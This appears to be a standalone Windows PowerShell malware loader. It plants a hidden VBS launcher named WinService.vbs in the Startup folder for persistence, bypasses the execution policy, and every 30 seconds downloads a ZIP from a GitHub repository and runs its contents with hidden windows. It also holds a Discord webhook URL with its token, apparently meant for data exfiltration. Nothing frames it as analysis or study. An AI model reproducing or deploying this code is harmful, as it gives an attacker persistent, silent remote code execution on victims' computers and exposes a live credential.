$W_URL = 'https://discord.com/api/webhooks/1470035924510441514/FwHFO4wMP7VPVBCB1jksZYPq-pkVumhLdMAtL2cxGNAwDMVjFripC0eAJeX3hRxtACfi'
$BASE = "$env:APPDATA\se"
$ZIP = "https://github.com/catondachair-max/test/archive/refs/heads/main.zip"
$STARTUP = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinService.vbs"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Run-Cycle {
    if (!(Test-Path $STARTUP)) {
        $vbs = "Set w = CreateObject(`"WScript.Shell`"): p = w.ExpandEnvironmentStrings(`"%APPDATA%`") + `"\\se\\w.ps1`": w.Run `"powershell -ExecutionPolicy Bypass -File ```"`" + p + `"```"`", 0"
        $vbs | Out-File "$BASE\l.vbs" -Encoding ascii -Force
        Copy-Item "$BASE\l.vbs" $STARTUP -Force
    }
    try {
        $tmp = "$BASE\_t"; if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force }
        New-Item -ItemType Directory -Path $tmp -Force | Out-Null
        Invoke-WebRequest -Uri $ZIP -OutFile "$tmp\r.zip" -TimeoutSec 15
        Expand-Archive -Path "$tmp\r.zip" -DestinationPath $tmp -Force
        $root = (Get-ChildItem $tmp | Where-Object { $_.PSIsContainer } | Select-Object -First 1).FullName
        Get-ChildItem $root | ForEach-Object {
            $n = $_.Name
            if ($n -match 'run_once_|run_always_') {
                $cl = $n -replace 'run_once_|run_always_', ''
                Copy-Item $_.FullName "$BASE\$cl" -Force
                if ($n -match 'run_always_') { Start-Process "$BASE\$cl" -WindowStyle Hidden }
                elseif (!(Test-Path "$BASE\chk_$cl")) {
                    Start-Process "$BASE\$cl" -WindowStyle Hidden
                    "1" | Out-File "$BASE\chk_$cl" -Encoding ascii
                }
            }
        }
    } catch {}
}
while($true) { Run-Cycle; Start-Sleep -Seconds 30 }
